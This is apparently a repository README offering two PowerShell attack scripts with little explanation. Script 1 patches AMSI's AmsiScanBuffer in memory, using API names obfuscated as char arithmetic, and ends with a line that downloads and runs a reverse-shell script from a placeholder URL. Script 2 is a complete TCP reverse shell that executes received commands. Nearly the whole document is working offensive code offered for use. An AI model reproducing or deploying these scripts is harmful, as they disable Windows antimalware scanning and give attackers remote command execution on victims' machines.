# AMSI-Bypasses
AMSI bypass scripts

## Script 1
```powershell
#  Global TLS Setting for all functions. If TLS12 isn't suppported you will get an exception when using the -Verbose parameter.
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Ssl3 -bor [Net.SecurityProtocolType]::Ssl2 -bor [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12

function AmsiBypass
{
    #This is Rastamouses in memory patch method 
    $ztzsw = @"
using System;
using System.Runtime.InteropServices;
public class ztzsw {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr msrelr, uint flNewProtect, out uint lpflOldProtect);
}
"@

  Add-Type $ztzsw

  $kgqdegv = [ztzsw]::LoadLibrary("$([CHar](97)+[CHar](109*53/53)+[cHAR]([ByTE]0x73)+[chAr]([bYTE]0x69)+[char]([byTE]0x2e)+[cHar](100*35/35)+[Char]([bytE]0x6c)+[ChAr]([BYtE]0x6c))")
  $dfwxos = [ztzsw]::GetProcAddress($kgqdegv, "$([char]([BytE]0x41)+[CHar]([byTE]0x6d)+[ChAR]([byTe]0x73)+[Char](105+69-69)+[ChAr](83+2-2)+[cHaR]([BYTe]0x63)+[chAR]([bYtE]0x61)+[Char]([Byte]0x6e)+[CHAr](42+24)+[CHAR](117+79-79)+[CHAR](88+14)+[cHAR]([bYte]0x66)+[CHAR](101+22-22)+[cHar]([bYTe]0x72))")
  $p = 0
  $qddw = "0xB8"
  $fwyu = "0x80"
  $bsyb = "0x57"
  [ztzsw]::VirtualProtect($dfwxos, [uint32]5, 0x40, [ref]$p)
  $ymfa = "0x07"
  $zcbf = "0x00"
  $dned = "0xC3"
  $msueg = [Byte[]] ($qddw,$bsyb,$zcbf,$ymfa,+$fwyu,+$dned)
  [System.Runtime.InteropServices.Marshal]::Copy($msueg, 0, $dfwxos, 6)

}

$Script:S3cur3Th1sSh1t_repo = "https://raw.githubusercontent.com/S3cur3Th1sSh1t"

function dependencychecks
{
    <#
        .DESCRIPTION
        Checks for System Role, Powershell Version, Proxy active/not active, Elevated or non elevated Session.
        Creates the Log directories or checks if they are already available.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    #Privilege Escalation Phase
         [int]$systemRoleID = $(get-wmiObject -Class Win32_ComputerSystem).DomainRole



         $systemRoles = @{
                              0         =    " Standalone Workstation    " ;
                              1         =    " Member Workstation        " ;
                              2         =    " Standalone Server         " ;
                              3         =    " Member Server             " ;
                              4         =    " Backup  Domain Controller " ;
                              5         =    " Primary Domain Controller "       
         }

        #Proxy Detect #1
        proxydetect
        pathcheck
        $PSVersion=$PSVersionTable.PSVersion.Major
        
        write-host "[?] Checking for Default PowerShell version ..`n" -ForegroundColor black -BackgroundColor white  ; sleep 1
        
        if($PSVersion -lt 2){
           
                Write-Warning  "[!] You have PowerShell v1.0.`n"
            
                Write-Warning  "[!] This script only supports Powershell verion 2 or above.`n"
                       
                exit  
        }
        
        write-host "       [+] ----->  PowerShell v$PSVersion`n" ; sleep 1
        
        write-host "[?] Detecting system role ..`n" -ForegroundColor black -BackgroundColor white ; sleep 1
        
        $systemRoleID = $(get-wmiObject -Class Win32_ComputerSystem).DomainRole
        
        if(($systemRoleID -ne 1) -or ($systemRoleID -ne 3) -or ($systemRoleID -ne 4) -or ($systemRoleID -ne 5)){
        
                "       [-] Some features in this script need access to the domain. They can only be run on a domain member machine. Pwn some domain machine for them!`n"
                              
                   
        }
        
        write-host "       [+] ----->",$systemRoles[[int]$systemRoleID],"`n" ; sleep 1

                    $Lookup = @{
    378389 = [version]'4.5'
    378675 = [version]'4.5.1'
    378758 = [version]'4.5.1'
    379893 = [version]'4.5.2'
    393295 = [version]'4.6'
    393297 = [version]'4.6'
    394254 = [version]'4.6.1'
    394271 = [version]'4.6.1'
    394802 = [version]'4.6.2'
    394806 = [version]'4.6.2'
    460798 = [version]'4.7'
    460805 = [version]'4.7'
    461308 = [version]'4.7.1'
    461310 = [version]'4.7.1'
    461808 = [version]'4.7.2'
    461814 = [version]'4.7.2'
    528040 = [version]'4.8'
    528049 = [version]'4.8'
    }

    write-host "       [+] -----> Installed .NET Framework versions "

    Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse |
  Get-ItemProperty -name Version, Release -EA 0 |
  Where-Object { $_.PSChildName -match '^(?!S)\p{L}'} |
  Select-Object @{name = ".NET Framework"; expression = {$_.PSChildName}}, 
  @{name = "Product"; expression = {$Lookup[$_.Release]}},Version, Release

}
iex(new-object net.webclient).downloadstring('LINK TO PS1 REV SHELL FILE')
```

## Script 2
```powershell
$LHOST = "127.0.0.1"; $LPORT = 31337; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```
